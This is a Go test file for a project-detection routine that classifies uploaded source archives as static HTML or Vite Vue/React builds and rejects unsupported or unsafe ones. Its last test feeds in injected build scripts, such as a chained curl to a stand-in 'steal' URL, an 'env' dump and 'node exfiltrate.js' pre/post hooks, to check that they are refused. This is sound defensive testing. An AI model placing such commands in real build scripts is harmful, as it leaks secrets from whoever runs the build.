package framework

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"strconv"
	"testing"
)

func sourceArchive(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var data bytes.Buffer
	gz := gzip.NewWriter(&data)
	tw := tar.NewWriter(gz)
	for name, content := range files {
		if err := tw.WriteHeader(&tar.Header{Name: name, Mode: 0644, Size: int64(len(content))}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return data.Bytes()
}

func TestDetectStaticAndVitePresetsWithoutRunningScripts(t *testing.T) {
	cases := []struct {
		name  string
		files map[string]string
		want  string
		build bool
	}{
		{"plain html", map[string]string{"index.html": "<h1>Hello</h1>", "assets/site.css": "body{}"}, "static-html", false},
		{"vue vite", map[string]string{"package.json": `{"scripts":{"build":"vite build"},"dependencies":{"vue":"3.5.0"},"devDependencies":{"vite":"6.0.0"}}`, "package-lock.json": `{"lockfileVersion":3,"packages":{}}`, "src/app.js": "x"}, "vite-vue", true},
		{"react vite", map[string]string{"package.json": `{"scripts":{"build":"vite build"},"dependencies":{"react":"19.0.0"},"devDependencies":{"vite":"6.0.0"}}`, "package-lock.json": `{"lockfileVersion":3,"packages":{}}`, "src/app.js": "x"}, "vite-react", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := Detect(sourceArchive(t, tc.files))
			if err != nil || got.Name != tc.want || got.RequiresBuild != tc.build {
				t.Fatalf("detect: %+v %v", got, err)
			}
		})
	}
}

func TestDetectRejectsUnsupportedRuntimeAndUnlockedVite(t *testing.T) {
	cases := []map[string]string{
		{"package.json": `{"scripts":{"build":"next build"},"dependencies":{"next":"15.0.0"}}`, "package-lock.json": "{}"},
		{"package.json": `{"scripts":{"build":"vite build"},"dependencies":{"react":"19.0.0"},"devDependencies":{"vite":"6.0.0"}}`},
		{"package.json": "not-json", "index.html": "fallback"},
	}
	for _, files := range cases {
		if _, err := Detect(sourceArchive(t, files)); err == nil {
			t.Fatal("unsupported or malformed project detected as deployable")
		}
	}
}

func TestDetectDoesNotTreatShellSuffixAsApprovedViteBuild(t *testing.T) {
	for _, command := range []string{
		"vite build && curl https://example.test/steal",
		"vite build; env",
		"vite build\nnode exfiltrate.js",
		"vite build --config unreviewed.js",
	} {
		t.Run(command, func(t *testing.T) {
			packageJSON := `{"scripts":{"build":` + strconv.Quote(command) + `},"dependencies":{"vue":"3.5.0"},"devDependencies":{"vite":"6.0.0"}}`
			_, err := Detect(sourceArchive(t, map[string]string{
				"index.html": "<div id='app'></div>", "package.json": packageJSON,
				"package-lock.json": `{"lockfileVersion":3,"packages":{}}`,
			}))
			if err == nil {
				t.Fatalf("unsafe build script %q was accepted", command)
			}
		})
	}
	result, err := Detect(sourceArchive(t, map[string]string{
		"index.html":        "<div id='app'></div>",
		"package.json":      `{"scripts":{"prebuild":"node exfiltrate.js","build":"vite build","postbuild":"node exfiltrate.js"},"dependencies":{"vue":"3.5.0"},"devDependencies":{"vite":"6.0.0"}}`,
		"package-lock.json": `{"lockfileVersion":3,"packages":{}}`,
	}))
	if err != nil || result.BuildCommand != "./node_modules/.bin/vite build" {
		t.Fatalf("build must use direct preset executable without npm pre/post hooks: %+v %v", result, err)
	}
}
